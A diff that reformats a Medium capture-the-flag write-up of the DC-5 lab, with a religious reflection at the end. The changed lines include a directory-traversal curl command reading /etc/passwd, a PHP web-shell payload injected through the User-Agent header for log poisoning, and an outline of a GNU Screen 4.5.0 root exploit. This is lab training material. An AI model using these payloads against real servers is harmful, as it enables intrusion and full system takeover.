@@ -1,22 +1,22 @@
-# 🎯 Unearthing the Truth in DC-5 \| From LFI to Log Poisoning 🛡️
+# DC-5
 
 From unvalidated parameters to system file exposure, we analyze the path to root. 100% completion rooted in precision and faith. 🎯🙏
 
----
+***
 
-### 🎯 Unearthing the Truth in DC-5 \| From LFI to Log Poisoning 🛡️
+### 🎯 Unearthing the Truth in DC-5 | From LFI to Log Poisoning 🛡️
 
-#### **From unvalidated parameters to system file exposure, we analyze the path to root. 100% completion rooted in precision and faith. 🎯🙏**
+#### **From unvalidated parameters to system file exposure, we analyze the path to root. 100% completion rooted in precision and faith. 🎯🙏**
 
 ![](https://cdn-images-1.medium.com/max/800/1*KUy8bMlL0Qz0O0UvZfxWSA.png)
 
-**Target:** *DC-5 (`192.168.247.26`)* **OS:** *Linux (Debian*) **Difficulty:** *Intermediate* **Attack Vectors:** *Web Enumeration -\> Parameter Fuzzing -\> Local File Inclusion (LFI) -\> Log Poisoning* -\> *SUID Privilege Escalation*
+**Target:** _DC-5 (`192.168.247.26`)_ **OS:** _Linux (Debian_) **Difficulty:** _Intermediate_ **Attack Vectors:** _Web Enumeration -> Parameter Fuzzing -> Local File Inclusion (LFI) -> Log Poisoning_ -> _SUID Privilege Escalation_
 
-> <a href="https://medium.com/system-weakness/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3?sk=4eba7545022c1bf098e3a5f47967171b" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/system-weakness/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3?sk=4eba7545022c1bf098e3a5f47967171b" target="_blank">**Not a Member?? Click Here to Read Full-Story**</a>
+> [**Not a Member?? Click Here to Read Full-Story**](https://medium.com/system-weakness/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3?sk=4eba7545022c1bf098e3a5f47967171b)
 
 ### Executive Summary
 
-**Assessment Date:** *January 24, 2026* **Risk Level:** *CRITICAL* **Author:** *R00t3dbyFa17h / Nicholas Mullenski*
+**Assessment Date:** _January 24, 2026_ **Risk Level:** _CRITICAL_ **Author:** _R00t3dbyFa17h / Nicholas Mullenski_
 
 #### Overview
 
@@ -24,17 +24,17 @@ An initial assessment of the “DC-5” server has identified a critical vulnera
 
 #### Key Findings (Preliminary):
 
-- <span id="5f50">**Local File Inclusion (LFI):** The `file` parameter on `thankyou.php` is unsanitized, allowing for directory traversal and arbitrary file read.</span>
-- <span id="1145">**System Disclosure:** Successful exfiltration of `/etc/passwd` confirmed the existence of a local user named `dc`.</span>
-- <span id="ec20">**Outdated Web Server:** The target uses Nginx 1.6.2, which is susceptible to various known exploits and configuration weaknesses.</span>
+* **Local File Inclusion (LFI):** The `file` parameter on `thankyou.php` is unsanitized, allowing for directory traversal and arbitrary file read.
+* **System Disclosure:** Successful exfiltration of `/etc/passwd` confirmed the existence of a local user named `dc`.
+* **Outdated Web Server:** The target uses Nginx 1.6.2, which is susceptible to various known exploits and configuration weaknesses.
 
 **Strategic Recommendation (Phase 1):** Immediate remediation of the PHP `include` functions is required to prevent path traversal. Following the confirmation of LFI, the next phase will involve testing for Log Poisoning to escalate from file read to system-level command execution.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Enumeration & Reconnaissance
 
-- <span id="2729">The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.</span>
+* The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.
 
 **1.1.1 Nmap Scan** A full service and script scan was performed to identify open ports and the software versions running on them.
 
@@ -42,8 +42,8 @@ An initial assessment of the “DC-5” server has identified a critical vulnera
 
 **Results:** The scan identified Port 80 and Port 111 as open.
 
-- <span id="51fd">**Port 80 (HTTP):** Nginx 1.6.2 (Debian)</span>
-- <span id="93f7">**Port 111 (RPC):** rpcbind</span>
+* **Port 80 (HTTP):** Nginx 1.6.2 (Debian)
+* **Port 111 (RPC):** rpcbind
 
 **1.1.2 Directory Enumeration** A directory brute-force scan was initiated to map the application structure and identify potential entry points.
 
@@ -53,8 +53,8 @@ An initial assessment of the “DC-5” server has identified a critical vulnera
 
 **Key Findings:** The scan returned several standard directories and confirmed the presence of a PHP environment.
 
-- <span id="4aca">`/index.php` (Status: 200)</span>
-- <span id="5e04">`/contact.php` (Manual Discovery)</span>
+* `/index.php` (Status: 200)
+* `/contact.php` (Manual Discovery)
 
 **1.1.3 Parameter Fuzzing** Manual inspection of the contact form revealed a redirect to `thankyou.php`. Subsequent testing focused on identifying hidden parameters that might allow for file inclusion.
 
@@ -62,7 +62,7 @@ An initial assessment of the “DC-5” server has identified a critical vulnera
 
 **1.2.1 Confirmation of Vulnerability** Utilizing `curl`, I attempted to read the `/etc/passwd` file by traversing the directory structure through the `file` parameter.
 
-- <span id="e3e2">**Note for ZSH Users:** Single quotes are required around the URL to prevent the shell from misinterpreting the `?` and `..` characters as wildcards.</span>
+* **Note for ZSH Users:** Single quotes are required around the URL to prevent the shell from misinterpreting the `?` and `..` characters as wildcards.
 
 **Command:** `curl 'http://192.168.247.26/thankyou.php?file=../../../../../../etc/passwd'`
 
@@ -72,9 +72,9 @@ An initial assessment of the “DC-5” server has identified a critical vulnera
 
 **Exfiltrated Data:**
 
-- <span id="d35d">`root:x:0:0:root:/root:/bin/bash`</span>
-- <span id="158f">`www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`</span>
-- <span id="85bf">`dc:x:1000:1000:dc,,,:/home/dc:/bin/bash`</span>
+* `root:x:0:0:root:/root:/bin/bash`
+* `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`
+* `dc:x:1000:1000:dc,,,:/home/dc:/bin/bash`
 
 #### 1.3 Log Analysis & Poisoning
 
@@ -86,7 +86,7 @@ An initial assessment of the “DC-5” server has identified a critical vulnera
 
 **1.3.2 Log Injection** A malicious request was crafted to “poison” the log file. A PHP system shell was injected into the `User-Agent` header, allowing the static log file to function as an interactive web shell.
 
-**Command:** `curl -A "<?php system(\$_GET['cmd']); ?>" 'http://192.168.247.26/'`
+**Command:** `curl -A "<?php system(\$_GET['cmd']); ?>" 'http://192.168.247.26/'`
 
 #### 1.4 Remote Code Execution (RCE)
 
@@ -134,7 +134,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 **2.2.3 Key Finding:** The binary **`/bin/screen-4.5.0`** was identified. Unlike standard system utilities like `passwd` or `mount`, this specific version of Screen is known to be vulnerable to a local privilege escalation exploit (CVE-2017-5618).
 
-#### 2.3 Exploit Research
+#### 2.3 Exploit Research
 
 Using `searchsploit`, the identified binary was matched to a known Local Privilege Escalation exploit.
 
@@ -142,7 +142,7 @@ Using `searchsploit`, the identified binary was matched to a known Local Privile
 
 **Results:**
 
-- <span id="824f">**GNU Screen 4.5.0 — Local Privilege Escalation \| linux/local/41154.sh**</span>
+* **GNU Screen 4.5.0 — Local Privilege Escalation | linux/local/41154.sh**
 
 #### 2.4 Privilege Escalation Implementation
 
@@ -150,10 +150,10 @@ Using `searchsploit`, the identified binary was matched to a known Local Privile
 
 **2.4.2 Deployment and Environmental Troubleshooting** The compiled binaries were transferred to the target’s `/tmp` directory via a Python HTTP server.
 
-- <span id="e5f4">**`libhax.so`**: A shared object designed to be injected via the dynamic linker.</span>
-- <span id="f169">**`rootshell`**: A statically linked binary (approx. 810KB) bundled with all necessary libraries to ensure execution on the target's older Debian architecture.</span>
+* **`libhax.so`**: A shared object designed to be injected via the dynamic linker.
+* **`rootshell`**: A statically linked binary (approx. 810KB) bundled with all necessary libraries to ensure execution on the target's older Debian architecture.
 
-#### 2.4 Exploitation: Breaking the “Screen”
+#### 2.4 Exploitation: Breaking the “Screen”
 
 **2.4.1 Forcing the Library Injection** The final escalation utilized the SUID-bit on `/bin/screen-4.5.0` to exploit a log-writing vulnerability. By targeting `/etc/ld.so.preload`, the system was forced to load the malicious `libhax.so` library upon the next execution of any SUID binary.
 
@@ -171,7 +171,7 @@ cd /tmp
 
 ![](https://cdn-images-1.medium.com/max/800/1*J5mgCNuhthjxmg-OUaDGxQ.png)
 
-### 3.0 Post-Exploitation & Loot
+### 3.0 Post-Exploitation & Loot
 
 **3.1 Proof of Compromise** With full root authority established, the assessment objectives were finalized by verifying access to the protected user and root directories. The flags were successfully located, confirming a total system compromise.
 
@@ -179,13 +179,13 @@ This is the final seal on the **DC-5** operation. This Red Team Mandate breaks d
 
 ### 🛡️ Red Team Mandate: DC-5 Post-Operation Analysis
 
-### Lessons Learned & Tactical Growth
+### Lessons Learned & Tactical Growth
 
 The primary takeaway from the DC-5 engagement was the necessity of **environmental adaptation**. Standard exploit scripts often fail in hardened or legacy environments due to library versioning.
 
-- <span id="691b">**Static vs. Dynamic Linking:** We learned that when the target’s GLIBC version is older than the attacker’s, dynamic binaries will fail. Mastering static compilation (`-static`) is a critical skill for bypassing "broken" compiler environments.</span>
-- <span id="1162">**The “Silent” Success:** We discovered that an exploit can appear to fail with terminal errors (like the `ld.so` errors we saw) while still successfully executing its primary payload (the `chown` and `chmod` of our rootshell).</span>
-- <span id="6c10">**Persistence in the Pivot:** The lab taught us to look past the first failure. When the `screen` command didn't pop a shell immediately, we analyzed the file permissions to realize the exploit had partially succeeded, requiring only a manual follow-up.</span>
+* **Static vs. Dynamic Linking:** We learned that when the target’s GLIBC version is older than the attacker’s, dynamic binaries will fail. Mastering static compilation (`-static`) is a critical skill for bypassing "broken" compiler environments.
+* **The “Silent” Success:** We discovered that an exploit can appear to fail with terminal errors (like the `ld.so` errors we saw) while still successfully executing its primary payload (the `chown` and `chmod` of our rootshell).
+* **Persistence in the Pivot:** The lab taught us to look past the first failure. When the `screen` command didn't pop a shell immediately, we analyzed the file permissions to realize the exploit had partially succeeded, requiring only a manual follow-up.
 
 ### Engineering Remediation & Defensive Hardening
 
@@ -197,27 +197,27 @@ To prevent a repeat of this compromise, the following remediations are recommend
 
 As we close the book on DC-5, we look at the struggle we faced with the code foundations — the headers, the libraries, and the compilation errors. It reminds us that no matter how hard we work on the surface, if the foundation isn’t set correctly, the structure will not hold.
 
-> ***“Therefore whosoever heareth these sayings of mine, and doeth them, I will liken him unto a wise man, which built his house upon a rock: And the rain descended, and the floods came, and the winds blew, and beat upon that house; and it fell not: for it was founded upon a rock.”**** — *Matthew 7:24–25
+> _**“Therefore whosoever heareth these sayings of mine, and doeth them, I will liken him unto a wise man, which built his house upon a rock: And the rain descended, and the floods came, and the winds blew, and beat upon that house; and it fell not: for it was founded upon a rock.”**_\* — \*Matthew 7:24–25
 
 **The Connection:** In this lab, we were the “winds and the floods” beating against the DC-5 server. We found the cracks in its foundation — the unvalidated parameters and the outdated “Screen” binary. Because the engineers had built their security on the “sand” of default configurations and unpatched software, their house fell.
 
 For us, the lesson is deeper. Just as we had to fix our code’s foundation by adding the correct headers and static libraries to make it stand against the target’s environment, we must build our lives on the **Rock of Christ**. When we align our “code” (our actions and heart) with His “headers” (His Word), we become a foundation that cannot be moved by the storms of life. We don’t just “hear” the methodology; we “do” it with precision and faith, knowing that the ultimate Deliverer has already secured our victory.
 
-### 🚀 Join the Mission
+### 🚀 Join the Mission
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="cd74">Is there a specific tool you wish existed?</span>
-- <span id="ab3b">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="4ce5">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/bKWJUSVNyX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/bKWJUSVNyX" title="https://discord.gg/bKWJUSVNyX"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>Welcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…</em>discord.gg</a><a href="https://discord.gg/bKWJUSVNyX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="d169f9c5e9c4caaa5161c9260fe8006b"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x57;elcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…_&#x64;iscord.gg](https://discord.gg/bKWJUSVNyX)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 30, 2026](https://medium.com/p/9812112bcce3).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 30, 2026](https://medium.com/p/9812112bcce3).
 
-<a href="https://medium.com/@nicholasmullenski/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
